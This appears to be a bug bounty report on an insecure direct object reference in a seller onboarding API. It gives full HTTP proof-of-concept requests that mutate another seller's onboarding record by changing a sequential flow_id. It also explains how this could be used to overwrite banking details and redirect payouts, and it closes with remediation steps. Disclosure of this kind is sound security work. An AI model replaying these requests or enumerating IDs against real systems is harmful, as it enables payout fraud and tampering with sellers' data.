# IDOR on Seller Onboarding Write Path Allows Takeover of Another Seller's Banking & Compliance Data

| | |
|---|---|
| Target | `prodhpadmin.zomans.com` — Seller Hub API (`seller.hyperpure.com`) |
| Endpoint | `POST /public/api/seller_hub/upsert_seller_onboarding_request` |
| Weakness | CWE-639: Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization |
| CVSS 3.0 | AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N = **9.6 Critical** |

## Summary
The onboarding write endpoint accepts a client-supplied `flow_id` in the
JSON body and never cross-checks it against the caller's own identity
(`entity_id`, derived from the JWT's `ID` claim) before executing a
`MARK_STEP_COMPLETE` mutation against it.

This is a direct contrast with the corresponding read endpoint,
`GET /public/api/seller_hub/get_seller_onboarding_request`, which correctly
resolves the flow strictly from the caller's own JWT and accepts no
`flow_id` parameter from the client at all. The write path trusts a
client-supplied object reference instead of deriving it from the
authenticated identity — exactly the check the read path already performs
correctly.

Since `flow_id` is a small sequential integer, any authenticated seller can
enumerate and mutate other sellers' onboarding records — which, depending on
which `step_id`/`substep_id` pair is targeted, cover company details,
**banking information**, and **legal/compliance documents (PAN, GST)**.

## Root cause
| Path | Behavior |
|---|---|
| `GET get_seller_onboarding_request` | Resolves the flow strictly from the JWT's `ID` claim — correct |
| `POST upsert_seller_onboarding_request` | Accepts `flow_id` directly from the request body, executes `MARK_STEP_COMPLETE` against it, with no ownership check — vulnerable |

## Proof of Concept

**1. Confirm the tester's own flow via the (correctly protected) GET endpoint:**

![GET request confirming own flow_id=491 bound to entity_id](<(1)-burp_evidence_flow491_source_redacted(2).png>)

```
GET /public/api/seller_hub/get_seller_onboarding_request
→ "flow_id": 491, "entity_id": "1811858", "flow_status": "CREATED"
```
`entity_id` matches the JWT's own ID claim, confirming ownership and that
this flow is still at an early stage (`CREATED`).

**2. Baseline — mutate the caller's own flow (expected, normal behavior):**
```http
POST /public/api/seller_hub/upsert_seller_onboarding_request HTTP/2
Host: prodhpadmin.zomans.com
Authorization: Bearer <own JWT>
Content-Type: application/json

{"flow_id":491,"type":"MARK_STEP_COMPLETE","mark_step_complete":{"step_id":168,"values":[{"substep_id":1354,"string_value":"TEST"}]}}
```
→ `200 OK` with standard field-validation errors — expected for an
incomplete flow owned by the caller.

**3. The bypass — same JWT, foreign `flow_id`:**

![Repeater request for foreign flow_id=490 returning the OTP-stage error](<(2)-burp_evidence_flow490_redacted(2).png>)

```http
POST /public/api/seller_hub/upsert_seller_onboarding_request HTTP/2
Host: prodhpadmin.zomans.com
Authorization: Bearer <own JWT, unchanged>
Content-Type: application/json

{"flow_id":490,"type":"MARK_STEP_COMPLETE","mark_step_complete":{"step_id":168,"values":[{"substep_id":1354,"string_value":"TEST_COMPANY_XYZ_999"},{"substep_id":1362,"string_value":"idortest@test.com"}]}}
```
→ `500 Internal Server Error`, `{"message":"failed to validate otp"}`.

This specific error only occurs on a flow that has already reached
OTP-verification — a stage the caller's own flow (`491`, status `CREATED`)
has never reached. This proves `flow_id: 490` is a real, pre-existing
record belonging to a different seller, and that the mutation was
processed against it under the caller's own identity, with no 401/403 at
any point.

**4. Control test — rule out auto-provisioning as an alternative explanation:**

![Control test for non-existent flow_id=999999999 returning the generic empty-flow validation errors](<(3)-burp_evidence_flow999999999_redacted(2).png>)

```json
{"flow_id":999999999, ...}
```
→ `200 OK` with the same generic validation errors seen on any brand-new
empty flow — confirming non-existent IDs are auto-provisioned as blank
records, while `flow_id: 490` behaved as a genuine, pre-existing foreign
record. This rules out coincidence.

## Impact

**Confidentiality (read via error-state inference):**
By sending mutations against `flow_id` values that don't belong to the
caller and observing the distinct error responses, an attacker can
determine whether a given `flow_id` is a real, active account, and which
onboarding stage it has reached — buildable into a live map of onboarding
progress and seller volume by scripting across the sequential ID space.

**Integrity (write — the critical part):**
The same endpoint is used, across different `step_id`/`substep_id`
combinations, to write every field collected during onboarding:
- **Banking details** (account number, IFSC/routing) — an attacker could overwrite another seller's payout account, silently redirecting future earnings to an account they control.
- **Legal/compliance documents** (PAN, GST) — tampering can invalidate a seller's compliance status or block payouts/activation.
- **Contact details** (phone/email) — could be chained into account-recovery flows that trust the onboarding record's stored contact details (not tested, to stay within safe PoC boundaries).

**Feasibility:**
- Zero privilege beyond a normal self-registered account
- Zero victim interaction — entirely server-side and silent
- `flow_id` is a small sequential integer, trivially enumerable, with no rate limiting observed
- No 401/403 signal on exploitation — traffic looks like a normal (or normally-erroring) API call, evading access-control-focused monitoring

## Remediation
- On `upsert_seller_onboarding_request`, derive the operative `flow_id` from the caller's own JWT identity (`entity_id`), exactly as `get_seller_onboarding_request` already does — never trust a client-supplied `flow_id` for a mutation.
- If a client-supplied `flow_id` must be accepted for any reason, enforce a strict ownership check (`flow.entity_id == caller.entity_id`) before executing any mutation, returning `403` on mismatch.
- Replace sequential integer IDs with non-guessable identifiers (UUIDs) to remove trivial enumerability as a secondary defense.
- Add rate limiting on this endpoint regardless of the authorization fix.
